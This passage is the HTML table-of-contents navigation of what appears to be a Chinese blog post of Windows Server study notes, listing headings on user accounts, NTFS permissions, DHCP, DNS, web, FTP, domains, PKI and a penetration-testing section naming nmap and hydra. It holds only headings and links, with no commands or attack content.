href="#%E4%B8%8E%E7%94%A8%E6%88%B7%E7%9B%B8%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%88net-user-%E5%BC%80%E5%A4%B4%EF%BC%89"><span class="toc-number">8.1.1.</span> <span class="toc-text">与用户相关的命令（net user 开头）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">8.1.2.</span> <span class="toc-text">与组相关的命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-number">8.2.</span> <span class="toc-text">2.服务器远程管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">8.2.1.</span> <span class="toc-text">2.1 远程桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-telnet"><span class="toc-number">8.2.2.</span> <span class="toc-text">2.2 telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E7%A0%B4%E8%A7%A3windows%E5%AF%86%E7%A0%81"><span class="toc-number">8.2.3.</span> <span class="toc-text">2.3 破解windows密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-NTFS%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90"><span class="toc-number">8.3.</span> <span class="toc-text">3.NTFS安全权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1NTFS%E6%9D%83%E9%99%90%E6%A6%82%E8%BF%B0"><span class="toc-number">8.3.1.</span> <span class="toc-text">3.1NTFS权限概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0"><span class="toc-number">8.3.2.</span> <span class="toc-text">3.2文件系统概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3NTFS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%89%B9%E7%82%B9-%E9%83%BD%E6%98%AFFATS%E4%B8%8D%E5%85%B7%E5%A4%87%E7%9A%84"><span class="toc-number">8.3.3.</span> <span class="toc-text">3.3NTFS文件系统的特点(都是FATS不具备的)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4%E4%BF%AE%E6%94%B9NTFS%E6%9D%83%E9%99%90"><span class="toc-number">8.3.4.</span> <span class="toc-text">3.4修改NTFS权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-1-%E5%8F%96%E6%B6%88%E6%9D%83%E9%99%90%E7%BB%A7%E6%89%BF"><span class="toc-number">8.3.4.1.</span> <span class="toc-text">3.4.1 取消权限继承</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-2-%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90"><span class="toc-number">8.3.4.2.</span> <span class="toc-text">3.4.2 文件及文件夹权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-3%E6%9D%83%E9%99%90%E7%B4%AF%E5%8A%A0"><span class="toc-number">8.3.4.3.</span> <span class="toc-text">3.4.3权限累加</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-5%E6%8B%92%E7%BB%9D%E6%9C%80%E5%A4%A7"><span class="toc-number">8.3.4.4.</span> <span class="toc-text">3.4.5拒绝最大</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-6%E5%8F%96%E5%BE%97%E6%89%80%E6%9C%89%E6%9D%83"><span class="toc-number">8.3.4.5.</span> <span class="toc-text">3.4.6取得所有权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-7%E5%BC%BA%E5%88%B6%E7%BB%A7%E6%89%BF"><span class="toc-number">8.3.4.6.</span> <span class="toc-text">3.4.7强制继承</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-8%E6%96%87%E4%BB%B6%E5%A4%8D%E5%88%B6%E5%AF%B9%E6%9D%83%E9%99%90%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">8.3.4.7.</span> <span class="toc-text">3.4.8文件复制对权限的影响</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.4.</span> <span class="toc-text">4.文件共享服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A6%82%E8%BF%B0"><span class="toc-number">8.4.1.</span> <span class="toc-text">4.1共享服务器概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB"><span class="toc-number">8.4.2.</span> <span class="toc-text">4.2创建共享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3%E8%AE%BF%E9%97%AE%E9%9A%90%E8%97%8F%E5%85%B1%E4%BA%AB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">8.4.3.</span> <span class="toc-text">4.3访问隐藏共享的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4%E5%85%B1%E4%BA%AB%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">8.4.4.</span> <span class="toc-text">4.4共享相关命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5%E5%B1%8F%E8%94%BD%E7%B3%BB%E7%BB%9F%E9%9A%90%E8%97%8F%E5%85%B1%E4%BA%AB%E8%87%AA%E5%8A%A8%E4%BA%A7%E7%94%9F%EF%BC%88c-d-%E7%AD%89%E3%80%82%E3%80%82%EF%BC%89"><span class="toc-number">8.4.5.</span> <span class="toc-text">4.5屏蔽系统隐藏共享自动产生（c$,d$等。。）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81"><span class="toc-number">8.4.6.</span> <span class="toc-text">4.6查看本地网络连接状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7%E5%85%B3%E9%97%AD445%E6%9C%8D%E5%8A%A1%EF%BC%88%E5%85%B3%E9%97%AD%E5%90%8E%E6%95%B4%E4%B8%AA%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E9%83%BD%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="toc-number">8.4.7.</span> <span class="toc-text">4.7关闭445服务（关闭后整个共享服务都无法使用）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%851-%EF%BC%9A%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">8.5.</span> <span class="toc-text">(补充1)：注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-number">8.5.1.</span> <span class="toc-text">1.概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">8.5.2.</span> <span class="toc-text">2.注册表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">8.5.3.</span> <span class="toc-text">3.注册表的基本操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E7%BB%B4%E6%8A%A4%E4%B8%8E%E4%BC%98%E5%8C%96"><span class="toc-number">8.5.4.</span> <span class="toc-text">4.注册表的维护与优化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8"><span class="toc-number">8.6.</span> <span class="toc-text">5.DHCP部署与安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1DHCP%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">8.6.1.</span> <span class="toc-text">5.1DHCP的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2DHCP%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">8.6.2.</span> <span class="toc-text">5.2DHCP相关概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3DHCP%E4%BC%98%E7%82%B9"><span class="toc-number">8.6.3.</span> <span class="toc-text">5.3DHCP优点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4DHCP%E5%8E%9F%E7%90%86"><span class="toc-number">8.6.4.</span> <span class="toc-text">5.4DHCP原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4-1-%E4%B9%9F%E7%A7%B0%E4%B8%BADHCP%E7%A7%9F%E7%BA%A6%E8%BF%87%E7%A8%8B%EF%BC%8C%E5%88%86%E4%B8%BA4%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">8.6.4.1.</span> <span class="toc-text">5.4.1.也称为DHCP租约过程，分为4个步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4-2-DHCP-%E7%BB%AD%E7%BA%A6%E8%BF%87%E7%A8%8B"><span class="toc-number">8.6.4.2.</span> <span class="toc-text">5.4.2.DHCP 续约过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-%E9%83%A8%E7%BD%B2DHCP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.6.5.</span> <span class="toc-text">5.5 部署DHCP服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6%E5%9C%B0%E5%9D%80%E4%BF%9D%E7%95%99"><span class="toc-number">8.6.6.</span> <span class="toc-text">5.6地址保留</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-7DHCP%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F"><span class="toc-number">8.6.7.</span> <span class="toc-text">5.7DHCP备份与还原</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-8%E9%80%89%E9%A1%B9%E4%BC%98%E5%85%88%E7%BA%A7%EF%BC%88important%EF%BC%89"><span class="toc-number">8.6.8.</span> <span class="toc-text">5.8选项优先级（important）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-9DHCP%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.6.9.</span> <span class="toc-text">5.9DHCP的攻击与防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-DNS%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8"><span class="toc-number">8.7.</span> <span class="toc-text">6.DNS部署与安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1DNS-Domain-Name-Service"><span class="toc-number">8.7.1.</span> <span class="toc-text">6.1DNS (Domain Name Service)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2%E5%9F%9F%E5%90%8D%E7%BB%84%E6%88%90"><span class="toc-number">8.7.2.</span> <span class="toc-text">6.2域名组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-1%E5%9F%9F%E5%90%8D%E7%BB%84%E6%88%90%E6%A6%82%E8%BF%B0"><span class="toc-number">8.7.2.1.</span> <span class="toc-text">6.2.1域名组成概述</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-2%E5%9F%9F%E5%90%8D%E7%BB%84%E6%88%90"><span class="toc-number">8.7.3.</span> <span class="toc-text">6.2.2域名组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-3%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">8.7.4.</span> <span class="toc-text">6.2.3监听端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-4DNS%E8%A7%A3%E6%9E%90%E7%A7%8D%E7%B1%BB"><span class="toc-number">8.7.5.</span> <span class="toc-text">6.2.4DNS解析种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-5DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">8.7.6.</span> <span class="toc-text">6.2.5DNS服务器的搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%90%AD%E5%BB%BA%E6%AD%A5%E9%AA%A4%EF%BC%9A%E5%AE%89%E8%A3%85%E5%A5%BD%E6%9C%8D%E5%8A%A1%E4%B9%8B%E5%90%8E"><span class="toc-number">8.7.6.1.</span> <span class="toc-text">（1）搭建步骤：安装好服务之后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%88%9B%E5%BB%BA%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.7.6.2.</span> <span class="toc-text">（2）创建主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%B5%8B%E8%AF%95"><span class="toc-number">8.7.6.3.</span> <span class="toc-text">（3）测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89DNS%E8%A7%A3%E6%9E%90%E8%BD%AC%E5%8F%91"><span class="toc-number">8.7.6.4.</span> <span class="toc-text">（4）DNS解析转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E8%BE%85%E5%8A%A9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="toc-number">8.7.6.5.</span> <span class="toc-text">（5）辅助DNS服务器的搭建与配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E6%B8%85%E7%A9%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%BC%93%E5%AD%98"><span class="toc-number">8.7.6.6.</span> <span class="toc-text">（6）清空DNS服务器的缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%887%EF%BC%89%E5%88%AB%E5%90%8D"><span class="toc-number">8.7.6.7.</span> <span class="toc-text">（7）别名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%888%EF%BC%89nslookup-%E5%A4%9A%E9%87%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">8.7.6.8.</span> <span class="toc-text">（8）nslookup 多重解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%889%EF%BC%89%E5%88%9B%E5%BB%BA%E5%86%85%E9%83%A8DNS%E8%A7%A3%E6%9E%90%EF%BC%88%E5%8F%AA%E5%9C%A8%E5%86%85%E9%83%A8%E6%9C%89%E6%95%88%EF%BC%89"><span class="toc-number">8.7.6.9.</span> <span class="toc-text">（9）创建内部DNS解析（只在内部有效）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%8810%EF%BC%89DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E5%9F%9F%E5%90%8D%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86%E9%A1%BA%E5%BA%8F"><span class="toc-number">8.7.6.10.</span> <span class="toc-text">（10）DNS服务器对域名请求的处理顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%8811%EF%BC%89%E5%AE%A2%E6%88%B7%E6%9C%BA%E5%9F%9F%E5%90%8D%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-number">8.7.6.11.</span> <span class="toc-text">（11）客户机域名请求解析顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%8812%EF%BC%89%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.7.6.12.</span> <span class="toc-text">（12）域名解析记录类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%8813%EF%BC%89DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%86%E7%B1%BB"><span class="toc-number">8.7.6.13.</span> <span class="toc-text">（13）DNS服务器分类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.8.</span> <span class="toc-text">7 WEB服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E5%B8%83%E8%BD%AF%E4%BB%B6"><span class="toc-number">8.8.1.</span> <span class="toc-text">7.1 服务器发布软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-%E9%83%A8%E7%BD%B2WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.8.2.</span> <span class="toc-text">7.2 部署WEB服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-1%E4%B8%BB%E6%9C%BA%E5%A4%B4%E5%80%BC"><span class="toc-number">8.8.2.1.</span> <span class="toc-text">7.2.1主机头值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tips-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%94%B3%E8%AF%B7%E7%AC%AC%E4%BA%8C%E4%B8%AAip%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">8.8.2.2.</span> <span class="toc-text">Tips:在服务器上申请第二个ip的操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-2%E7%BD%91%E7%AB%99%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.8.2.3.</span> <span class="toc-text">7.2.2网站类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-3%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E5%AD%90%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">8.8.2.4.</span> <span class="toc-text">7.2.3访问网站根目录下的子文件夹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-FTP%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.9.</span> <span class="toc-text">8 FTP服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1ftp%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F%EF%BC%88Important%EF%BC%89"><span class="toc-number">8.9.1.</span> <span class="toc-text">8.1ftp的工作方式（Important）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">8.9.2.</span> <span class="toc-text">8.2ftp服务器的搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-ftp%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="toc-number">8.9.3.</span> <span class="toc-text">8.3 ftp服务器软件介绍</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%9F%9F%EF%BC%88Domain%EF%BC%89"><span class="toc-number">8.10.</span> <span class="toc-text">9.域（Domain）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83"><span class="toc-number">8.10.1.</span> <span class="toc-text">9.1内网环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2%E5%9F%9F%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-number">8.10.2.</span> <span class="toc-text">9.2域的组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3%E5%9F%9F%E7%9A%84%E9%83%A8%E7%BD%B2"><span class="toc-number">8.10.3.</span> <span class="toc-text">9.3域的部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-4%E7%BB%84%E7%BB%87%E5%8D%95%E4%BD%8D%EF%BC%88OU%EF%BC%9AOrganization-Unit%EF%BC%89"><span class="toc-number">8.10.4.</span> <span class="toc-text">9.4组织单位（OU：Organization Unit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-5%E7%BB%84%E7%AD%96%E7%95%A5%EF%BC%88GPO%EF%BC%9AGroup-Policy%EF%BC%89"><span class="toc-number">8.10.5.</span> <span class="toc-text">9.5组策略（GPO：Group Policy）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-6PKI"><span class="toc-number">8.10.6.</span> <span class="toc-text">9.6PKI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-6-1PKI%E6%A6%82%E8%BF%B0"><span class="toc-number">8.10.6.1.</span> <span class="toc-text">9.6.1PKI概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-6-2%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%89%E8%A6%81%E7%B4%A0"><span class="toc-number">8.10.6.2.</span> <span class="toc-text">9.6.2信息安全三要素</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-6-3%E5%BA%94%E7%94%A8%E9%A2%86%E5%9F%9F"><span class="toc-number">8.10.6.3.</span> <span class="toc-text">9.6.3应用领域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-6-4%E5%85%AC%E9%92%A5%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF"><span class="toc-number">8.10.6.4.</span> <span class="toc-text">9.6.4公钥加密技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-6-5CA%E6%90%AD%E5%BB%BA"><span class="toc-number">8.10.6.5.</span> <span class="toc-text">9.6.5CA搭建</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95%EF%BC%88%E6%89%80%E6%9C%89%E6%9C%BA%E5%AD%90%E8%BF%98%E5%8E%9F%E5%BF%AB%E7%85%A7%EF%BC%8C%E9%87%8D%E6%96%B0%E9%85%8D%E7%BD%AE%EF%BC%89"><span class="toc-number">8.11.</span> <span class="toc-text">10 综合测试（所有机子还原快照，重新配置）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#10-1-%E6%B5%8B%E8%AF%951"><span class="toc-number">8.11.1.</span> <span class="toc-text">10.1 测试1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%89%E9%85%8D%E7%BD%AEDHCP%E6%97%B6%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98"><span class="toc-number">8.11.1.1.</span> <span class="toc-text">1）配置DHCP时出现问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89%E9%85%8D%E7%BD%AEHTTPS%E6%9C%8D%E5%8A%A1%EF%BC%9A"><span class="toc-number">8.11.1.2.</span> <span class="toc-text">2）配置HTTPS服务：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%89%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">8.11.1.3.</span> <span class="toc-text">3）权限问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%89%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%88important%EF%BC%89"><span class="toc-number">8.11.1.4.</span> <span class="toc-text">4）生产环境中（important）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%89%E8%B5%8B%E4%BA%88%E6%9D%83%E9%99%90"><span class="toc-number">8.11.1.5.</span> <span class="toc-text">5）赋予权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%EF%BC%89%E7%94%A8%E5%9F%9F%E8%B4%A6%E6%88%B7%E7%99%BB%E9%99%86"><span class="toc-number">8.11.1.6.</span> <span class="toc-text">6）用域账户登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%EF%BC%89%E9%9D%9E%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8Web%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.11.1.7.</span> <span class="toc-text">7）非匿名访问服务器Web服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-2-%E6%B5%8B%E8%AF%952"><span class="toc-number">8.11.2.</span> <span class="toc-text">10.2 测试2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.11.2.1.</span> <span class="toc-text">1)文件共享服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89CA%E7%9A%84web%E6%9C%8D%E5%8A%A1%E4%B9%9F%E5%BF%85%E9%A1%BB%E7%94%A8%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">8.11.2.2.</span> <span class="toc-text">2）CA的web服务也必须用域名访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%89%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%B3%E8%AF%B7"><span class="toc-number">8.11.2.3.</span> <span class="toc-text">3）证书的申请</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%89%E5%BD%93%E9%9C%80%E8%A6%81%E9%85%8D%E7%BD%AE%E5%A4%9A%E4%B8%AAHTTPS%E6%9C%8D%E5%8A%A1%E8%80%8C%E9%9C%80%E8%A6%81%E5%AF%BC%E5%85%A5%E5%A4%9A%E4%B8%AA%E8%AF%81%E4%B9%A6"><span class="toc-number">8.11.2.4.</span> <span class="toc-text">4）当需要配置多个HTTPS服务而需要导入多个证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%89%E4%BD%BF%E7%94%A8%E7%BB%84%E7%AD%96%E7%95%A5%E6%97%B6"><span class="toc-number">8.11.2.5.</span> <span class="toc-text">5）使用组策略时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%EF%BC%89%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">8.11.2.6.</span> <span class="toc-text">6）设置用户登陆执行脚本的组策略</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">8.12.</span> <span class="toc-text">11渗透测试流程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84445%E7%AB%AF%E5%8F%A3%EF%BC%88%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%EF%BC%89-windowsXP-%E6%94%BB%E5%87%BB-windows2003"><span class="toc-number">8.12.1.</span> <span class="toc-text">例子：攻击服务器的445端口（共享服务）&#x3D;&#x3D;&#x3D;&#x3D; windowsXP   攻击   windows2003</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-1%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nmap"><span class="toc-number">8.12.2.</span> <span class="toc-text">11.1扫描工具nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-2%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hydra"><span class="toc-number">8.12.3.</span> <span class="toc-text">11.2爆破工具hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-3%E5%9B%9E%E9%A1%BE%E5%AD%A6%E8%BF%87%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%E6%96%B9%E6%B3%95"><span class="toc-number">8.12.4.</span> <span class="toc-text">11.3回顾学过破解密码方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="toc-number">8.13.</span> <span class="toc-text">12OSI七层模型</span></a><ol 